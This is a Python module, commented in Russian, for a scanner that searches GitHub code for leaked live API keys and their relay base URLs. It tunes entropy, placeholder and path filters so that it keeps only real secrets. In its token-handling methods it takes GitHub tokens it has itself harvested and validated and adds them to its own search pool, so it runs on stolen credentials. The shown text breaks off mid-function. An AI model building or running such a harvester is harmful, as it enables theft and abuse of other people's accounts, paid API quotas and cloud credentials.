"""
Модуль сканера - продюсер поиска кода GitHub

Основные функции:
1. Интеллектуальное извлечение пар (Key, Base_URL)
2. Проверка энтропии - фильтрация низкокачественных ключей (например, sk-test-123)
3. Чёрный список доменов - фильтрация мусорных URL (localhost и т.д.)
4. Осознание контекста - интеллектуальное извлечение URL транзитных серверов
5. Специальное распознавание Azure
"""

import re
import os
import math
import time
import queue
import asyncio
import threading
from datetime import datetime, timezone
from typing import Optional, List, Set, Tuple, Dict
from dataclasses import dataclass
from collections import Counter
from functools import lru_cache

import aiohttp
from aiohttp import ClientTimeout, TCPConnector
from github import Github, GithubException, RateLimitExceededException

from config import (
    config, REGEX_PATTERNS, BASE_URL_PATTERNS,
    COMPILED_REGEX_PATTERNS, COMPILED_BASE_URL_PATTERNS,
    COMPILED_AZURE_URL_PATTERN,
    AZURE_URL_PATTERN, AZURE_CONTEXT_KEYWORDS, URL_PRIORITY_KEYWORDS
)
from database import Database, LeakedKey, KeyStatus, normalize_base_url
from loguru import logger


# ============================================================================
#                              Определение констант
# ============================================================================

# Порог энтропии (ключи ниже этого значения считаются тестовыми/фейковыми)
# Эмпирическое значение: 3.8 для более строгой фильтрации, уменьшает ложные срабатывания (после тестирования можно изменить на 4.0)
ENTROPY_THRESHOLD = 3.8

# Конфигурация асинхронной загрузки
# Конкурентность снижена с 80 до 60 для уменьшения накладных расходов повторных попыток и повышения стабильности
ASYNC_DOWNLOAD_CONCURRENCY = 60
ASYNC_DOWNLOAD_TIMEOUT = ClientTimeout(total=15, connect=8)

# Конфигурация фильтрации файлов
MAX_FILE_SIZE_KB = 500  # Максимальный размер файла (КБ)

# Разрешённые расширения файлов для сканирования
ALLOWED_EXTENSIONS = {
    '.py', '.js', '.ts', '.jsx', '.tsx',  # Файлы кода
    '.env', '.env.local', '.env.production', '.env.development',  # Файлы окружения
    '.yml', '.yaml', '.toml',  # Файлы конфигурации
    '.sh', '.bash', '.zsh',  # Скрипты оболочки
    '.php', '.rb', '.go', '.rs', '.java',  # Другие языки
    '.conf', '.cfg', '.ini',  # Файлы конфигурации
    '.dockerfile', '',  # Dockerfile без расширения
}

# Заблокированные расширения файлов (не сканируются, даже если содержат ключи)
BLOCKED_EXTENSIONS = {
    '.lock', '.min.js', '.min.css', '.map',  # Сгенерированные файлы
    '.md', '.rst', '.txt',  # Документация
    '.html', '.htm', '.css', '.scss', '.less',  # Фронтенд файлы
    '.svg', '.png', '.jpg', '.jpeg', '.gif', '.ico',  # Изображения
    '.woff', '.woff2', '.ttf', '.eot',  # Шрифты
    '.pdf', '.doc', '.docx', '.xls', '.xlsx',  # Документы
    '.zip', '.tar', '.gz', '.rar',  # Архивы
    '.exe', '.dll', '.so', '.dylib',  # Бинарные файлы
    '.pyc', '.pyo', '.class',  # Скомпилированные файлы
    '.ipynb', '.csv',  # Jupyter Notebook и файлы данных (часто содержат примеры ключей)
}

# Чёрный список путей файлов (пропускаются, если путь содержит эти строки)
PATH_BLACKLIST = [
    '/test/', '/tests/', '/__tests__/',
    '/spec/', '/specs/',
    '/mock/', '/mocks/', '/__mocks__/',
    '/fixture/', '/fixtures/',
    '/example/', '/examples/',
    '/sample/', '/samples/',
    '/demo/', '/demos/',
    '/doc/', '/docs/',
    '/vendor/', '/node_modules/', '/venv/', '/.venv/',
    '/dist/', '/build/', '/out/',
    '/coverage/', '/.github/ISSUE_TEMPLATE/',
    # Добавлено: директории песочниц/тестовых окружений
    '/sandbox/', '/playground/', '/staging/',
    '/tutorial/', '/tutorials/',
    '/workshop/', '/workshops/',
    '/boilerplate/', '/starter/',
]

# Чёрный список доменов (URL, содержащие эти подстроки, пропускаются)
DOMAIN_BLACKLIST = [
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    'example.com',
    'test.com',
    'my-api',
    'your-api',
    'xxx',
    'placeholder',
    'fake',
    'dummy',
    'sample',
    'mock',
    # Домены разработки/тестирования
    'staging.',
    'sandbox.',
    'dev.',
    'demo.',
    'test.',
    '.local',
    '.internal',
    'ngrok.io',
    'localtunnel',
]

# Чёрный список недействительных base_url (эти сайты не являются API транзитными серверами)
INVALID_BASE_URL_DOMAINS = [
    # Документация
    'docs.djangoproject.com',
    'docs.python.org',
    'developer.mozilla.org',
    'stackoverflow.com',
    'medium.com',
    'dev.to',
    'readthedocs.io',
    'gitbook.io',
    # Другие API сервисы (не совместимые с OpenAI)
    'themoviedb.org',
    'tmdb.org',
    'spotify.com',
    'twitter.com',
    'facebook.com',
    'google.com/maps',
    'maps.googleapis.com',
    'youtube.com',
    # Сайты инструментов/фреймворков
    'prisma.io',
    'pris.ly',
    'vercel.com',
    'netlify.com',
    'heroku.com',
    'railway.app',
    'render.com',
    # Другие несвязанные сайты
    'every.to',
    'makersuite.google.com',
    'prompthor.com',
    'agentrouter.org',  # Оставить, выглядит как реальный транзитный сервер
]

# Известные домены транзитных серверов (высокий приоритет)
KNOWN_RELAY_DOMAINS = [
    'api.openai.com',
    'api.anthropic.com',
    # Популярные транзитные серверы
    'api.siliconflow.cn',
    'api.deepseek.com',
    'api.moonshot.cn',
    'api.zhipuai.cn',
    'api.baichuan-ai.com',
    'api.minimax.chat',
    'api.lingyiwanwu.com',
    # Ключевые слова транзитных серверов
    'openai',
    'chatgpt',
    'gpt',
    'llm',
    'ai-gateway',
    'one-api',
    'new-api',
    'chat-api',
]

# Паттерны тестовых ключей (пропускаются, если ключ содержит эти строки)
TEST_KEY_PATTERNS = [
    # Базовые тестовые ключевые слова
    # ВНИМАНИЕ: короткие паттерны 'abcdef'/'123456'/'aaaaaa'/'xxxxxx'
    # убраны — они ложноположительно бьют по РЕАЛЬНЫМ случайным ключам
    # (напр. sk-proj-...uvwxyz012345... содержит 'abcdef'/'123456').
    # Оставляем только явные плейсхолдеры/слова-маркеры.
    'test', 'demo', 'example', 'sample', 'fake', 'dummy', 'placeholder',
    'xxx', 'your_', 'your-', '<your', '{your',
    'insert', 'replace',
    # Ключевые слова разработки/тестирования
    'dev_', 'dev-', 'staging', 'sandbox', 'tutorial', 'workshop',
    'playground', 'temp_', 'tmp_', 'mock_', 'stub_',
    # Добавлено: больше паттернов фейковых значений
    'changeme', 'fixme', 'todo', 'secret', 'password', 'credential',
    'redacted', 'hidden', 'masked', 'obfuscated', 'censored',
    'null', 'none', 'undefined', 'empty', 'blank',
    'default', 'template', 'boilerplate', 'skeleton',
    # Распространённые плейсхолдеры
    'api_key_here', 'your_api_key', 'enter_key', 'put_key',
    'add_your', 'fill_in', 'replace_with', 'insert_your',
]

# Паттерны ложных срабатываний с высокой энтропией (выглядят как настоящие ключи, но на самом деле фейковые)
HIGH_ENTROPY_FALSE_POSITIVES = [
    # Base64 закодированные распространённые строки
    'dGVzdA==',  # "test"
    'ZXhhbXBsZQ==',  # "example"
    'c2FtcGxl',  # "sample"
    # UUID формат (не API ключ)
    r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$',
]


# ============================================================================
#                              Инструменты фильтрации файлов
# ============================================================================

def should_skip_file(file_path: str, file_size: int = 0) -> Tuple[bool, str]:
    """
    Проверяет, следует ли пропустить файл
    
    Args:
        file_path: Путь к файлу
        file_size: Размер файла (байты)
        
    Returns:
        (should_skip, причина)
    """
    file_path_lower = file_path.lower()
    
    # 1. Проверка размера файла
    if file_size > 0 and file_size > MAX_FILE_SIZE_KB * 1024:
        return True, f"file_too_large:{file_size//1024}KB"
    
    # 2. Проверка чёрного списка путей
    for blacklist_path in PATH_BLACKLIST:
        if blacklist_path in file_path_lower:
            return True, f"path_blacklist:{blacklist_path}"
    
    # 3. Проверка расширения файла - сначала проверяем заблокированные
    # Получаем расширение файла
    ext = ''
    if '.' in file_path:
        # Обработка составных расширений (.min.js и т.д.)
        if file_path_lower.endswith('.min.js'):
            ext = '.min.js'
        elif file_path_lower.endswith('.min.css'):
            ext = '.min.css'
        else:
            ext = '.' + file_path.rsplit('.', 1)[-1].lower()
    
    # Проверка в списке блокировки
    if ext in BLOCKED_EXTENSIONS:
        return True, f"blocked_ext:{ext}"
    
    # 4. Если есть расширение, проверяем в списке разрешённых
    #    Примечание: общие типы файлов могут не иметь расширения (например, Dockerfile)
    #    или расширение не в списке. В таком случае не пропускаем, продолжаем сканирование
    
    # Проверка особых имён файлов - эти файлы обязательно сканируются
    important_files = ['dockerfile', '.env', 'config', 'secret', 'credential',
                       'settings', 'constants', 'secrets', 'application',
                       'appsettings', 'properties', 'litellm', 'proxy',
                       'gateway', 'values.yaml', 'values.yml']
    file_name = file_path.rsplit('/', 1)[-1].lower() if '/' in file_path else file_path.lower()
    if any(imp in file_name for imp in important_files):
        return False, ""
    
    return False, ""


def _slog_i18n(key: str, **kw) -> str:
    """Translate a scanner log key using UI language."""
    try:
        from tui_i18n import tf as _i18n_tf, resolve_lang as _i18n_lang
        return _i18n_tf(key, _i18n_lang(), **kw)
    except Exception:
        return key


# ============================================================================
#                              Модели данных
# ============================================================================

@dataclass
class ScanResult:
    """Класс данных результата сканирования"""
    platform: str       # openai, azure, gemini, anthropic, relay
    api_key: str        # API ключ
    base_url: str       # Привязанный Base URL
    source_url: str     # URL файла GitHub
    is_azure: bool = False
    is_relay: bool = False  # Является ли транзитным сервером
    context: str = ""


# ============================================================================
#                              Вспомогательные функции
# ============================================================================

@lru_cache(maxsize=4096)
def calculate_entropy(s: str) -> float:
    """
    Вычисляет энтропию Шеннона строки - с LRU кэшированием

    Настоящие API ключи имеют высокую энтропию (выглядят как случайный набор символов)
    Тестовые ключи (например, sk-test-12345) имеют низкую энтропию (упорядоченные)

    Args:
        s: Входная строка

    Returns:
        Энтропия (от 0 до 8, чем выше, тем более случайная)
    """
    if not s:
        return 0.0

    # Подсчёт частоты символов
    freq = Counter(s)
    length = len(s)

    # Вычисление энтропии
    entropy = 0.0
    for count in freq.values():
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)

    return entropy


# Английские биграммы — штрафуют осмысленные слова в строке
ENGLISH_BIGRAMS = frozenset({
    'th', 'he', 'in', 'er', 'an', 're', 'on', 'es', 'st', 'en',
    'at', 'ou', 'ed', 'nd', 'to', 'it', 'al', 'ar', 'or', 'te',
    'of', 'is', 'se', 'ha', 'as', 'ou', 'io', 'le', 've', 'co',
    'me', 'de', 'hi', 'ri', 'ro', 'ic', 'ne', 'ea', 'ce', 'li',
})


@lru_cache(maxsize=4096)
def score_secret_candidate(s: str) -> float:
    """
    Комбинированная оценка кандидата на секрет.

    Учитывает:
    - Энтропию Шеннона
    - Разнообразие классов символов (буквы, цифры, спецсимволы)
    - Штраф за осмысленные английские биграммы (плейсхолдеры типа "mysecretkey")
    - Бонус за длину ключа

    Args:
        s: Кандидат на секрет

    Returns:
        Оценка (>= 5.0 вероятно секрет)
    """
    if not s or len(s) < 16:
        return 0.0

    ent = calculate_entropy(s)
    score = ent

    # Бонус за разнообразие классов символов
    if re.search(r'[a-z]', s) and re.search(r'[A-Z]', s):
        score += 0.3
    if re.search(r'\d', s):
        score += 0.2
    if re.search(r'[_\-\.]', s):
        score += 0.1

    # Штраф за осмысленные английские биграммы
    # Ограничить штраф для длинных ключей — sk-proj- (170+ символов)
    # может содержать много случайных биграмм, штраф до -2.0 отбрасывает
    # легитимные ключи. Cap: максимум -0.5 для ключей > 50 символов.
    bigrams = [s[i:i+2].lower() for i in range(len(s)-1)]
    english_count = sum(1 for b in bigrams if b in ENGLISH_BIGRAMS)
    max_penalty = 0.5 if len(s) > 50 else 2.0
    score -= min(english_count * 0.1, max_penalty)

    return score


# Адаптивные пороги энтропии по типам ключей
ENTROPY_THRESHOLDS = {
    'openai': 4.8,        # sk-proj- (170+ символов, высокая энтропия)
    'anthropic': 4.7,     # sk-ant- (100+ символов)
    'gemini': 4.5,        # AIza (39 символов)
    'huggingface': 4.6,   # hf_ (35 символов)
    'groq': 4.7,          # gsk_ (52 символа)
    'replicate': 4.5,     # r8_ (40 символов)
    'perplexity': 4.6,    # pplx- (48 символов)
    'fireworks': 4.6,     # fw_ (42 символа)
    'xai': 4.6,           # xai- (42 символа)
    'openrouter': 4.6,    # sk-or-v1- (42 символа)
    'cerebras': 4.6,      # csk- (40+ символов)
    'voyage': 4.6,        # va- (40+ символов)
    'jina': 4.6,          # jina_ (40+ символов)
    'lepton': 4.6,        # lep- (40+ символов)
    'modal': 4.6,         # ak- (40+ символов)
    'tavily': 4.5,        # tvly- (30+ символов)
    'firecrawl': 4.5,     # fc- (30+ символов)
    'apify': 4.5,         # apify_api_ (30+ символов)
    'langfuse': 4.6,      # sk-lf-/pk-lf- (30+ символов)
    'astra': 4.5,         # AstraCS: (30+ символов)
    'sourcegraph': 4.6,   # sgp_ (30+ символов)
    'wordware': 4.6,      # ww_ (30+ символов)
    'llamacloud': 4.5,    # llc-/llx- (30+ символов)
    'aws_access_key': 4.0,# AKIA (20 символов, uppercase+digits)
    'stripe': 4.3,        # sk_live_ (28 символов)
    'sendgrid': 4.8,      # SG. (67 символов)
    'notion': 4.6,        # secret_/ntn_ (42 символа)
    'linear': 4.6,        # lin_api_ (42 символа)
    'digitalocean': 4.5,  # dop_v1_ (64+ символов)
    'runpod': 4.5,        # RPv2: (40+ символов)
    'elevenlabs': 4.5,    # sk_ (32 символа)
    'default': 3.8,       # По умолчанию
}


@lru_cache(maxsize=2048)
def is_test_key(api_key: str) -> bool:
    """
    Определяет, является ли ключ тестовым/примерным - с LRU кэшированием

    Args:
        api_key: API ключ

    Returns:
        True, если это тестовый ключ
    """
    key_lower = api_key.lower()
    return any(pattern in key_lower for pattern in TEST_KEY_PATTERNS)


@lru_cache(maxsize=1024)
def is_blacklisted_url(url: str) -> bool:
    """
    Определяет, находится ли URL в чёрном списке - с LRU кэшированием

    Args:
        url: Строка URL

    Returns:
        True, если URL в чёрном списке
    """
    if not url:
        return False

    url_lower = url.lower()
    return any(blacklist in url_lower for blacklist in DOMAIN_BLACKLIST)


def mask_key(api_key: str) -> str:
    """Маскирует API ключ"""
    if len(api_key) <= 12:
        return api_key[:4] + "..." + api_key[-4:]
    return api_key[:8] + "..." + api_key[-4:]


# ============================================================================
#                              Класс сканера
# ============================================================================

class GitHubScanner:
    """
    Сканер кода GitHub (продюсер)
    
    Основные улучшения:
    1. Фильтрация по энтропии - пропускает тестовые ключи с низкой энтропией
    2. Чёрный список доменов - пропускает localhost и т.д.
    3. Интеллектуальное извлечение URL
    """
    
    def __init__(
        self, 
        result_queue: queue.Queue,
        db: Database,
        stop_event: threading.Event,
        dashboard = None  # UI панель управления
    ):
        self.result_queue = result_queue
        self.db = db
        self.stop_event = stop_event
        self.dashboard = dashboard
        
        # Пул клиентов GitHub
        self._github_clients: List[Github] = []
        self._current_client_index = 0
        self._client_lock = threading.Lock()
        # Токены, отброшенные по 401 (Bad credentials) — не спамим ими вечно.
        self._bad_github_tokens: Set[str] = set()
        
        self._init_github_clients()
        
        # Множество обработанных ключей (кэш в памяти для ускорения запросов)
        self._processed_keys: Set[str] = set()
        self._processed_lock = threading.Lock()
        
        # Множество обработанных SHA файлов (кэш в памяти для ускорения запросов)
        # Примечание: постоянное хранение в таблице scanned_blobs базы данных
        self._processed_shas: Set[str] = set()
        self._sha_lock = threading.Lock()
        self._sha_batch_buffer: List[str] = []
        
        # Предварительная загрузка отсканированных SHA из базы данных (опционально, для ускорения)
        self._preload_scanned_shas()
        
        # Компиляция регулярных выражений
        self._key_patterns = COMPILED_REGEX_PATTERNS
        self._base_url_patterns = COMPILED_BASE_URL_PATTERNS
        self._azure_url_pattern = COMPILED_AZURE_URL_PATTERN
        
        # Статистика
        self.stats = {
            "total_found": 0,
            "files_scanned": 0,
            "skipped_entropy": 0,
            "skipped_blacklist": 0,
            "skipped_sha": 0,
            "skipped_file_filter": 0,
        }
        
        # Компоненты асинхронной загрузки
        self._async_semaphore = asyncio.Semaphore(ASYNC_DOWNLOAD_CONCURRENCY)
        self._aiohttp_session: Optional[aiohttp.ClientSession] = None
        # Переиспользование цикла событий - избегаем частого создания/уничтожения
        self._event_loop: Optional[asyncio.AbstractEventLoop] = None
        self._loop_lock = threading.Lock()
    
    def _init_github_clients(self):
        """Инициализация пула клиентов GitHub"""
        if config.proxy_url:
            os.environ['HTTP_PROXY'] = config.proxy_url
            os.environ['HTTPS_PROXY'] = config.proxy_url
        else:
            os.environ.pop('HTTP_PROXY', None)
            os.environ.pop('HTTPS_PROXY', None)
        
        if config.github_tokens:
            for token in config.github_tokens:
                client = Github(
                    login_or_token=token,
                    per_page=30,
                    timeout=config.request_timeout,
                )
                self._github_clients.append(client)
        else:
            client = Github(per_page=30, timeout=config.request_timeout)
            self._github_clients.append(client)
    
    def _get_github_client(self) -> Github:
        with self._client_lock:
            # Пропускаем забаненные по 401 токены (если остались живые).
            n = len(self._github_clients)
            if n:
                for _ in range(n):
                    idx = self._current_client_index % n
                    client = self._github_clients[idx]
                    token = getattr(client, "oauth_token", None)
                    if token and token in self._bad_github_tokens:
                        self._current_client_index = (idx + 1) % n
                        continue
                    return client
            # Все забанены — вернём текущий (хуже не будет).
            return self._github_clients[self._current_client_index % n]
    
    def _bad_token(self, token: str) -> None:
        """Отбраковать GitHub-токен по 401 (Bad credentials).
        Больше не ротируем на него бесконечно — выкидываем из пула.
        """
        if not token:
            return
        with self._client_lock:
            self._bad_github_tokens.add(token)
        self._log(_slog_i18n("log_token_rejected", tail=token[-6:]), "ERROR")

    def _all_tokens_bad(self) -> bool:
        """Все GitHub-токены отбракованы по 401 — поиск невозможен."""
        with self._client_lock:
            n = len(self._github_clients)
            return n > 0 and len(self._bad_github_tokens) >= n

    
    def _rotate_client(self) -> int:
        with self._client_lock:
            self._current_client_index = (self._current_client_index + 1) % len(self._github_clients)
            # Периодическая проверка новых найденных GitHub токенов
            # (каждые ~10 ротаций для нового пула из 4 токенов = ~40 запросов)
            if self._current_client_index % max(1, len(self._github_clients) // 2) == 0:
                self._sync_found_tokens()
            return self._current_client_index

    def _add_github_token(self, token: str) -> bool:
        """Добавить новый GitHub токен в пул для поиска."""
        # Проверить что токен ещё не в пуле
        existing_tokens = set()
        for g in self._github_clients:
            try:
                t = g.oauth_token if hasattr(g, 'oauth_token') else None
                if t:
                    existing_tokens.add(t)
            except Exception:
                pass
        if token in existing_tokens:
            return False
        try:
            client = Github(login_or_token=token, per_page=30,
                           timeout=config.request_timeout)
            # Проверить что токен реально работает
            user = client.get_user()
            _ = user.login  # one API call to verify
            with self._client_lock:
                self._github_clients.append(client)
            self._log(_slog_i18n("log_token_added", prefix=token[:8], user=user.login), "VALID")
            if self.dashboard:
                self.dashboard.add_log(
                    f"Добавлен GitHub токен: {token[:8]}... ({len(self._github_clients)} всего)",
                    "VALID")
            return True
        except Exception as e:
            logger.debug(f"Не удалось добавить GitHub токен: {e}")
            return False

    def _sync_found_tokens(self, limit=5):
        """Добавить валидные GitHub токены из БД в пул сканера."""
        if not hasattr(config, 'db_path'):
            return
        try:
            with self.db._get_connection() as conn:
                rows = conn.execute(
                    "SELECT api_key FROM leaked_keys "
                    "WHERE platform='github' AND status IN ('valid','confirmed') "
                    "ORDER BY id DESC LIMIT ?", (limit,)
                ).fetchall()
            for (token,) in rows:
                self._add_github_token(token)
        except Exception as e:
            logger.debug(f"sync_found_tokens error: {e}")
    
    def _preload_scanned_shas(self):
        """
        Предварительная загрузка отсканированных SHA из базы данных в кэш памяти
        
        Это позволяет избежать обращения к базе данных каждый раз, повышая производительность
        """
        try:
            with self._sha_lock:
                self._processed_shas.update(self.db._blob_cache)
            if self.db._blob_cache:
                self._log(_slog_i18n("log_sha_cache_loaded", n=len(self.db._blob_cache)), "INFO")
        except Exception as e:
            self._log(_slog_i18n("log_sha_load_err", err=e), "WARN")

    def _get_event_loop(self) -> asyncio.AbstractEventLoop:
        """Получение или создание цикла событий - потокобезопасное переиспользование"""
        with self._loop_lock:
            if self._event_loop is None or self._event_loop.is_closed():
                self._event_loop = asyncio.new_event_loop()
                self._aiohttp_session = None  # новый loop, новая сессия
            return self._event_loop

    async def _get_aiohttp_session(self) -> aiohttp.ClientSession:
        """Получение или создание сессии aiohttp - глобальное переиспользование"""
        if self._aiohttp_session is None or self._aiohttp_session.closed:
            connector = TCPConnector(
                limit=ASYNC_DOWNLOAD_CONCURRENCY,
                limit_per_host=20,  # Ограничение соединений на один хост
                ttl_dns_cache=300,  # Кэш DNS 5 минут
                keepalive_timeout=30,  # Поддержание соединения 30 секунд
                enable_cleanup_closed=True,
                resolver=aiohttp.resolver.ThreadedResolver(),
            )
            self._aiohttp_session = aiohttp.ClientSession(
                connector=connector,
                timeout=ASYNC_DOWNLOAD_TIMEOUT,
                trust_env=True
            )
        return self._aiohttp_session
    
    async def _close_aiohttp_session(self):
        """Закрытие сессии aiohttp"""
        if self._aiohttp_session and not self._aiohttp_session.closed:
            await self._aiohttp_session.close()
    
    async def _async_download_file(self, raw_url: str) -> Optional[str]:
        """
        Асинхронная загрузка содержимого файла
        
        Используется aiohttp вместо requests для значительного увеличения скорости загрузки
        """
        async with self._async_semaphore:
            try:
                session = await self._get_aiohttp_session()
                proxy = config.proxy_url if config.proxy_url else None
                
                async with session.get(raw_url, proxy=proxy) as resp:
                    if resp.status == 200:
                        return await resp.text(errors='ignore')
                    return None
            except asyncio.TimeoutError:
                return None
            except aiohttp.ClientError:
                return None
            except Exception:
                return None
    
    async def _async_download_batch(
        self, 
        files_metadata: List[Tuple[str, str, any]]
    ) -> List[Tuple[str, str, str]]:
        """
        Пакетная асинхронная загрузка файлов
        
        Args:
            files_metadata: [(raw_url, html_url, code_file), ...]
            
        Returns:
            [(html_url, content, code_file), ...] Успешно загруженные файлы
        """
        async def download_one(raw_url: str, html_url: str, code_file):
            content = await self._async_download_file(raw_url)
            if content:
                return (html_url, content, code_file)
            return None
        
        tasks = [
            download_one(raw_url, html_url, code_file)
            for raw_url, html_url, code_file in files_metadata
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Фильтрация неудачных и ошибочных результатов
        return [
            r for r in results 
            if r is not None and not isinstance(r, Exception)
        ]
    
    def _run_async_download(self, files_metadata: List[Tuple[str, str, any]]) -> List[Tuple[str, str, str]]:
        """
        Запуск асинхронной загрузки в синхронном контексте - переиспользование цикла событий

        Используется постоянный цикл событий для избежания накладных расходов частого создания/уничтожения
        """
        loop = self._get_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(self._async_download_batch(files_metadata))
        except Exception as e:
            logger.debug(f"Ошибка асинхронной загрузки: {type(e).__name__}: {e}")
            return []
    
    def _is_key_processed(self, api_key: str) -> bool:
        with self._processed_lock:
            if api_key in self._processed_keys:
                return True
            if self.db.key_exists(api_key):
                self._processed_keys.add(api_key)
                return True
            return False
    
    def _mark_key_processed(self, api_key: str):
        with self._processed_lock:
            self._processed_keys.add(api_key)
    
    def _is_sha_processed(self, sha: str) -> bool:
        """
        Проверяет, был ли файл SHA уже обработан (двухуровневая проверка)
        
        1. Сначала проверка кэша памяти (быстро)
        2. Затем проверка базы данных (постоянное хранение)
        """
        if not sha:
            return False
        
        # 1. Проверка кэша памяти
        with self._sha_lock:
            if sha in self._processed_shas:
                return True
        
        # 2. Проверка базы данных (постоянное хранение)
        if self.db.is_blob_scanned(sha):
            # Синхронизация с кэшем памяти
            with self._sha_lock:
                self._processed_shas.add(sha)
            return True
        
        return False
    
    def _mark_sha_processed(self, sha: str):
        """
        Отмечает файл SHA как обработанный (двухуровневая запись)
        
        1. Запись в кэш памяти
        2. Постоянное хранение в базе данных (с буферизацией)
        """
        if not sha:
            return
        
        # 1. Кэш памяти
        with self._sha_lock:
            self._processed_shas.add(sha)
            self._sha_batch_buffer.append(sha)
            # Flush каждые 50 SHA — один executemany вместо 50 INSERT
            if len(self._sha_batch_buffer) >= 50:
                batch = self._sha_batch_buffer[:]
                self._sha_batch_buffer.clear()
            else:
                return
        
        # 2. Постоянное хранение в базе данных (batch)
        try:
            self.db.mark_blobs_scanned_batch(batch)
        except Exception:
            # Fallback на поодиночную запись при ошибке batch
            for s in batch:
                self.db.mark_blob_scanned(s)
    
    def _log(self, message: str, level: str = "INFO"):
        """Вывод лога на панель управления"""
        if self.dashboard:
            self.dashboard.add_log(message, level)
    
    # ========================================================================
    #                           Логика фильтрации
    # ========================================================================
    
    def _should_skip_key(self, api_key: str) -> tuple:
        """
        Проверяет, следует ли пропустить этот ключ (улучшенная версия)

        Правила фильтрации:
        1. Обнаружение тестовых ключей
        2. Комбинированная оценка (энтропия + биграммы + классы символов)
        3. Адаптивный порог по типу ключа
        4. Обнаружение повторяющихся символов
        5. Распространённые паттерны фейковых значений

        Returns:
            (should_skip, причина)
        """
        # 1. Проверка, является ли ключ тестовым
        if is_test_key(api_key):
            return True, "test_key"

        # 2. Определение типа ключа для адаптивного порога
        platform_key = 'default'
        for prefix in ['sk-proj-', 'sk-ant-', 'AIza', 'hf_', 'gsk_', 'r8_',
                        'pplx-', 'fw_', 'xai-', 'sk-or-v1-', 'csk-', 'va-',
                        'jina_', 'lep-', 'ak-', 'tvly-', 'fc-', 'apify_api_',
                        'sk-lf-', 'pk-lf-', 'AstraCS:', 'sgp_', 'ww_',
                        'llc-', 'llx-', 'AKIA', 'dop_v1_', 'RPv2:',
                        'sk_live_', 'sk_', 'eyJ']:
            if api_key.startswith(prefix):
                platform_key = prefix.rstrip('-')
                break

        # 3. Комбинированная оценка (энтропия + биграммы + классы символов)
        score = score_secret_candidate(api_key)
        threshold = ENTROPY_THRESHOLDS.get(platform_key, ENTROPY_THRESHOLDS['default'])
        if score < threshold:
            return True, f"low_score:{score:.2f}"

        # 4. Обнаружение повторяющихся символов (например, aaaaaaa, 1111111)
        if len(set(api_key)) < 5:
            return True, "repetitive_chars"

        # 5. Распространённые паттерны фейковых значений.
        # ВНИМАНИЕ: короткие 'xxxxxxxx'/'yyyyyyyy'/'12345678'/'abcdefgh'
        # убраны — бьют по РЕАЛЬНЫМ случайным ключам
        # (напр. sk-proj-...defghijklmn... содержит 'abcdefgh').
        fake_patterns = [
            'your_api_key', 'your-api-key', 'api_key_here',
            'insert_key', 'replace_me', 'placeholder',
            'test1234', 'demo1234', 'sample12'
        ]
        key_lower = api_key.lower()
        for pattern in fake_patterns:
            if pattern in key_lower:
                return True, f"fake_pattern:{pattern}"

        # 6. Последовательные символы — ТОЛЬКО чисто-алфавитные или
        # чисто-цифровые цепочки длиной >=8. Смешанные (xyz0123, uvwxyz01)
        # не трогаем — это нормально для реальных base64-ключей.
        if self._has_sequential_chars(key_lower, 8, alpha_only=True):
            return True, "sequential_chars"

        return False, ""
    
    def _has_sequential_chars(self, s: str, min_len: int = 8,
                               alpha_only: bool = False) -> bool:
        """Обнаруживает последовательные возрастающие/убывающие символы.

        alpha_only=True — только цепочки из одного класса (буквы ИЛИ цифры),
        чтобы не ловить реальные base64-ключи вида '...xyz0123...'/'...uvwxyz01...'.
        """
        if len(s) < min_len:
            return False
        # Для alpha_only пропускаем символы не своего класса (разрываем цепочку).
        def _cls(ch: str) -> str:
            if ch.isalpha():
                return 'a'
            if ch.isdigit():
                return 'd'
            return 'o'
        count = 1
        for i in range(1, len(s)):
            if alpha_only and _cls(s[i]) != _cls(s[i - 1]):
                count = 1
                continue
            if ord(s[i]) == ord(s[i - 1]) + 1 or ord(s[i]) == ord(s[i - 1]) - 1:
                count += 1
                if count >= min_len:
                    return True
            else:
                count = 1
        return False
    
    def _should_skip_url(self, url: str) -> tuple:
        """
        Проверяет, следует ли пропустить этот URL
        
        Returns:
            (should_skip, причина)
        """
        if is_blacklisted_url(url):
            return True, "blacklisted"
        return False, ""
    
    # ========================================================================
    #                           Извлечение контекста
    # ========================================================================
    
    def _extract_context(self, content: str, key_pos: int) -> str:
        """Извлекает контекст вокруг ключа"""
        lines = content.split('\n')
        line_num = content[:key_pos].count('\n')
        
        start_line = max(0, line_num - config.context_window)
        end_line = min(len(lines), line_num + config.context_window + 1)
        
        return '\n'.join(lines[start_line:end_line])
    
    def _is_azure_context(self, context: str) -> bool:
        """Проверяет, является ли контекст Azure"""
        context_lower = context.lower()
        return any(kw.lower() in context_lower for kw in AZURE_CONTEXT_KEYWORDS)
    
    def _extract_azure_endpoint(self, context: str) -> Optional[str]:
        """Извлекает Azure Endpoint"""
        match = self._azure_url_pattern.search(context)
        return match.group(0) if match else None
    
    def _is_valid_relay_url(self, url: str) -> bool:
        """
        Проверяет, может ли URL быть действительным API транзитным сервером

        Исключает документацию, несвязанные API и т.д.
        """
        url_lower = url.lower()

        # 1. Проверка чёрного списка недействительных доменов
        for invalid_domain in INVALID_BASE_URL_DOMAINS:
            if invalid_domain in url_lower:
                return False

        # 2. Проверка на наличие известных характеристик транзитных серверов
        for relay_keyword in KNOWN_RELAY_DOMAINS:
            if relay_keyword in url_lower:
                return True

        # 2b. Типичные relay-шаблоны (myclaudehehe.cc, api-fwd.com, *.workers.dev и т.п.)
        relay_patterns = [
            '/v1/', '/v1beta/', '/v2/', '/chat/', '/messages',
            'api.', 'gateway', 'proxy', 'relay', 'forward',
            '.workers.dev', '.pages.dev', '.railway.app',
            '.fly.dev', '.onrender.com', '.cyclic.app',
            '.replit.app', '.vercel.app', '.netlify.app',
            'ngrok-free.app', 'ngrok.io', 'serveo.net',
            'api-', 'proxy-', 'backend', '/completions',
        ]
        for pat in relay_patterns:
            if pat in url_lower:
                return True

        # 3. Проверка, похож ли URL-путь на API эндпоинт
        # Настоящие транзитные серверы обычно имеют короткие домены без сложных путей
        from urllib.parse import urlparse
        try:
            parsed = urlparse(url)
            path = parsed.path.strip('/')

            # Исключение URL со сложными путями (обычно ссылки на документацию)
            if path and '/' in path and len(path) > 20:
                return False

            # Исключение очевидных страниц документации/настроек
